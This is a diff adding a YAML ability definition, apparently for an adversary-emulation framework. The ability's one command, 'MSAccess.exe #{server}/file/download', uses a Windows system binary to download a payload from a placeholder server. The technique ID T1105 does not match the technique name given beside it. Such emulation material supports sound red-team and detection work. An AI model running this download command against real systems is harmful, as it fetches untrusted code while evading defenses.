@@ -1,0 +1,21 @@
+- id: 6b59ff09-c8ba-94a5-3292-b6f1e19d9640
+  name: MSAccess.exe - Downloads payload from remote server
+  description: Downloads payload from remote server
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'MSAccess.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Nir Chako
+  created: '2023-04-30'
+  modified: '2023-04-30'
+  operating_system: Windows All Versions
